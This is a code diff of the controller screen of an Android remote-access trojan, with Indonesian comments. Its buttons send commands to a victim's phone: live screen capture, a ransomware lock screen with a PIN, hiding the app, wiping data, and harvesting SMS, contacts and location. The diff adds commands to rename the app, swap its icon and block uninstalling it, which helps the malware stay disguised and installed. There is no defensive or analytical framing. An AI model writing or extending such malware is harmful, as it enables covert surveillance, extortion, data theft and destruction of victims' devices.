@@ -2,13 +2,7 @@ package com.testapp;
 
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.content.Intent;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.net.Uri;
 import android.os.Bundle;
-import android.os.Handler;
-import android.util.Base64;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -26,7 +20,6 @@ public class ControlActivity extends Activity {
     private String deviceId;
     private LinearLayout container;
     private ImageView liveScreenView;
-    private Handler handler = new Handler();
     private boolean screenActive = false;
 
     @Override
@@ -47,7 +40,7 @@ public class ControlActivity extends Activity {
             return;
         }
 
-        // === TOMBOL INSTAN ===
+        // ========== TOMBOL INSTAN ==========
         addButton("🔦 Flashlight", () -> sendCmd("flashlight"));
         addButton("🔒 Lock Device", () -> {
             showInputDialog("PIN (optional)", pin -> {
@@ -66,7 +59,7 @@ public class ControlActivity extends Activity {
             });
         });
 
-        // === TOMBOL BUTUH INPUT ===
+        // ========== TOMBOL INPUT ==========
         addButton("🖼️ Change Wallpaper", () -> {
             showInputDialog("URL Gambar", url -> {
                 JSONObject p = new JSONObject();
@@ -119,7 +112,7 @@ public class ControlActivity extends Activity {
             });
         });
 
-        // === LIVE SCREEN ===
+        // ========== LIVE SCREEN ==========
         addButton("🖥️ Start Live Screen", () -> {
             sendCmd("start_screen");
             screenActive = true;
@@ -139,7 +132,7 @@ public class ControlActivity extends Activity {
             Toast.makeText(this, "Sadap layar dihentikan", Toast.LENGTH_SHORT).show();
         });
 
-        // === RANSOMWARE ===
+        // ========== RANSOMWARE ==========
         addButton("🎭 Ransomware Activate", () -> {
             showTwoInputDialog("HTML", "PIN", (html, pin) -> {
                 JSONObject p = new JSONObject();
@@ -149,11 +142,37 @@ public class ControlActivity extends Activity {
         });
         addButton("🔓 Ransomware Deactivate", () -> sendCmd("ransomware_deactivate"));
 
-        // === HIDE / UNHIDE APP ===
+        // ========== HIDE / UNHIDE APP ==========
         addButton("👻 Hide App", () -> sendCmd("hide_app"));
         addButton("👁️ Unhide App", () -> sendCmd("unhide_app"));
 
-        // === DESTROY ===
+        // ========== FITUR BARU: UBAH NAMA, IKON, ANTI‑UNINSTALL ==========
+        addButton("✏️ Ubah Nama APK", () -> {
+            showInputDialog("Nama baru APK", newName -> {
+                JSONObject p = new JSONObject();
+                try { p.put("newName", newName); } catch (Exception e) {}
+                sendCmd("rename_app", p);
+            });
+        });
+        addButton("🖼️ Ubah Ikon (URL)", () -> {
+            showInputDialog("URL gambar (PNG/JPG)", url -> {
+                JSONObject p = new JSONObject();
+                try { p.put("url", url); } catch (Exception e) {}
+                sendCmd("change_icon", p);
+            });
+        });
+        addButton("🛡️ Anti‑Uninstall ON", () -> {
+            JSONObject p = new JSONObject();
+            try { p.put("state", true); } catch (Exception e) {}
+            sendCmd("anti_uninstall", p);
+        });
+        addButton("🔓 Anti‑Uninstall OFF", () -> {
+            JSONObject p = new JSONObject();
+            try { p.put("state", false); } catch (Exception e) {}
+            sendCmd("anti_uninstall", p);
+        });
+
+        // ========== DESTROY ==========
         addButton("💣 Wipe Data", () -> {
             new AlertDialog.Builder(this)
                 .setTitle("Konfirmasi")
@@ -163,7 +182,7 @@ public class ControlActivity extends Activity {
                 .show();
         });
 
-        // === DATA HARVESTER ===
+        // ========== DATA HARVESTER ==========
         addButton("📊 Dapatkan SMS", () -> requestData("get_sms"));
         addButton("👥 Kontak", () -> requestData("get_contacts"));
         addButton("📍 Lokasi", () -> requestData("get_location"));
